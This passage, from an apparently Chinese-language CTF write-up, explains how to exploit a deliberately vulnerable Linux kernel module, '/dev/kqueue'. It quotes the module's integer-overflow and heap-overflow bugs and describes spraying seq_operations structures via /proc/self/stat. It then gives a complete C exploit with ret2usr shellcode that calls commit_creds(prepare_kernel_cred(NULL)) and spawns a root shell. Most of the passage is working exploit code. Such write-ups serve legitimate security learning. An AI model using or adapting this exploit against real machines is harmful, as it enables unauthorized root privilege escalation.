        for(i=1;imax_entries+1;i++){
            /* If kqueue entry found , do the necessary */
            if(kqueue_entry && request.data && queue->data_size){
                if(kqueue_entry->idx == request.entry_idx){
                    validate(memcpy(kqueue_entry->data,request.data,queue->data_size));
                    exists = true;
                }
            }
            kqueue_entry = kqueue_entry->next;
        }
        /* What if the idx is 0, it means we have to update the main kqueue's data */
        if(request.entry_idx==0 && kqueue_entry && request.data && queue->data_size){
            validate(memcpy(queue->data,request.data,queue->data_size));
            return 0;
        }
        if(!exists)
            return NOT_EXISTS;
        return 0;
    }
**save_kqueue_entries**
这个功能主要是分配一块现有 `queue->queue_size` 大小的 object 然后把 queue->data 与其所有
queue_entries->data 的内容拷贝到上边，而其每次拷贝的字节数用的是我们传入的 `request.data_size`
，在这里很明显存在堆溢出
    static noinline long save_kqueue_entries(request_t request){
        /* Check for out of bounds queue_idx requests */
        if(request.queue_idx > MAX_QUEUES)
            err("[-] Invalid kqueue idx");
        /* Check if queue is already saved or not */
        if(isSaved[request.queue_idx]==true)
            err("[-] Queue already saved");
        queue *queue = validate(kqueues[request.queue_idx]);
        /* Check if number of requested entries exceed the existing entries */
        if(request.max_entries  queue->max_entries)
            err("[-] Invalid entry count");
        /* Allocate memory for the kqueue to be saved */
        char *new_queue = validate((char *)kzalloc(queue->queue_size,GFP_KERNEL));
        /* Each saved entry can have its own size */
        if(request.data_size > queue->queue_size)
            err("[-] Entry size limit exceed");
        /* Copy main's queue's data */
        if(queue->data && request.data_size)
            validate(memcpy(new_queue,queue->data,request.data_size));
        else
            err("[-] Internal error");
        new_queue += queue->data_size;
        /* Get to the entries of the kqueue */
        queue_entry *kqueue_entry = (queue_entry *)(queue + (sizeof(queue)+1)/8);
        /* copy all possible kqueue entries */
        uint32_t i=0;
        for(i=1;idata)
                break;
            if(kqueue_entry->data && request.data_size)
                validate(memcpy(new_queue,kqueue_entry->data,request.data_size));
            else
                err("[-] Internal error");
            kqueue_entry = kqueue_entry->next;
            new_queue += queue->data_size;
        }
        /* Mark the queue as saved */
        isSaved[request.queue_idx] = true;
        return 0;
    }
这里有个全局数组标识一个 queue 是否 saved 了
    bool isSaved[MAX_QUEUES] = {false};
## 0x02.漏洞利用
###  Step I.整数溢出
考虑到在 create_queue 中使用 `request.max_entries + 1` 来进行判定，因此我们可以传入 0xffffffff
使得其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得 `queue->max_entries =
0xffffffff`，此时我们的 queue->queue_size 便为 0x18
###  Step II.堆溢出 + 堆喷射覆写 seq_operations 控制内核执行流
前面我们说到在 save_kqueue_entries() 中存在着堆溢出，而在该函数中分配的 object 大小为 queue->queue_size，即
0x18，应当从 `kmalloc-32` 中取，那么我们来考虑在该 slab 中可用的结构体
不难想到的是， **seq_operations** 这个结构体同样从 `kmalloc-32` 中分配，当我们打开一个 stat 文件时（如
`/proc/self/stat` ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于
`/include/linux/seq_file.h` 当中，只定义了四个函数指针，如下：
    struct seq_operations {
        void * (*start) (struct seq_file *m, loff_t *pos);
        void (*stop) (struct seq_file *m, void *v);
        void * (*next) (struct seq_file *m, void *v, loff_t *pos);
        int (*show) (struct seq_file *m, void *v);
    };
当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 `proc_read_iter` 指针，其默认值为
`seq_read_iter()` 函数，定义于 `fs/seq_file.c` 中，注意到有如下逻辑：
    ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
    {
        struct seq_file *m = iocb->ki_filp->private_data;
        //...
        p = m->op->start(m, &m->index);
        //...
即其会调用 seq_operations 中的 start 函数指针，那么 **我们只需要控制 seq_operations- >start 后再读取对应
stat 文件便能控制内核执行流**
我们可以使用 **堆喷射** （heap spray）的手法在内核空间喷射足够多的 seq_operations 结构体从而保证我们能够溢出到其中之一
###  Step III.ret2usr + ret2shellcode
由于没有开启 smep、smap、kpti，故 ret2usr 的攻击手法在本题中是可行的，但是由于开启了 kaslr 的缘故，我们并不知道
prepare_kernel_cred 和 commit_creds 的地址，似乎无法直接执行
`commit_creds(prepare_kernel_cred(NULL))`
这里 ScuPax0s 师傅给出了一个美妙的解法：通过编写 **shellcode**
在内核栈上找恰当的数据以获得内核基址，执行`commit_creds(prepare_kernel_cred(NULL))` 并返回到用户态
###  Final Exploit
故最终的 exp 如下：
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef struct
    {
        uint32_t    max_entries;
        uint16_t    data_size;
        uint16_t    entry_idx;
        uint16_t    queue_idx;
        char*       data;
    }request_t;
    long dev_fd;
    size_t root_rip;
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus(void)
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    void getRootShell(void)
    {   
        puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
        if(getuid())
        {
            puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
            exit(-1);
        }
        puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
        system("/bin/sh");
        exit(0);// to exit the process normally instead of segmentation fault
    }
    void errExit(char * msg)
    {
        printf("\033[31m\033[1m[x] Error: \033[0m%s\n", msg);
        exit(EXIT_FAILURE);
    }
    void createQueue(uint32_t max_entries, uint16_t data_size)
    {
        request_t req = 
        {
            .max_entries    = max_entries,
            .data_size      = data_size,
        };
        ioctl(dev_fd, 0xDEADC0DE, &req);
    }
    void editQueue(uint16_t queue_idx,uint16_t entry_idx,char *data)
    {
        request_t req =
        {
            .queue_idx  = queue_idx,
            .entry_idx  = entry_idx,
            .data       = data,
        };
        ioctl(dev_fd, 0xDAADEEEE, &req);
    }
    void deleteQueue(uint16_t queue_idx)
    {
        request_t req = 
        {
            .queue_idx = queue_idx,
        };
        ioctl(dev_fd, 0xBADDCAFE, &req);
    }
    void saveQueue(uint16_t queue_idx,uint32_t max_entries,uint16_t data_size)
    {
        request_t req =
        {
            .queue_idx      = queue_idx,
            .max_entries    = max_entries,
            .data_size      = data_size,
        };
        ioctl(dev_fd, 0xB105BABE, &req);
    }
    void shellcode(void)
    {
        __asm__(
            "mov r12, [rsp + 0x8];"
            "sub r12, 0x201179;"
            "mov r13, r12;"
            "add r12, 0x8c580;"  // prepare_kernel_cred
            "add r13, 0x8c140;"  // commit_creds
            "xor rdi, rdi;"
            "call r12;"
            "mov rdi, rax;"
            "call r13;"
            "swapgs;"
            "mov r14, user_ss;"
            "push r14;"
            "mov r14, user_sp;"
            "push r14;"
            "mov r14, user_rflags;"
            "push r14;"
            "mov r14, user_cs;"
            "push r14;"
            "mov r14, root_rip;"
            "push r14;"
            "iretq;"
        );
    }
    int main(int argc, char **argv, char**envp)
    {
        long        seq_fd[0x200];
        size_t      *page;
        size_t      data[0x20];
        saveStatus();
        root_rip = (size_t) getRootShell;
        dev_fd = open("/dev/kqueue", O_RDONLY);
        if (dev_fd < 0)
            errExit("FAILED to open the dev!");
        for (int i = 0; i < 0x20; i++)
            data[i] = (size_t) shellcode;
        createQueue(0xffffffff, 0x20 * 8);
        editQueue(0, 0, data);
        for (int i = 0; i < 0x200; i++)
            seq_fd[i] = open("/proc/self/stat", O_RDONLY);
        saveQueue(0, 0, 0x40);
        for (int i = 0; i < 0x200; i++)
            read(seq_fd[i], data, 1);
    }
运行即可提权到 root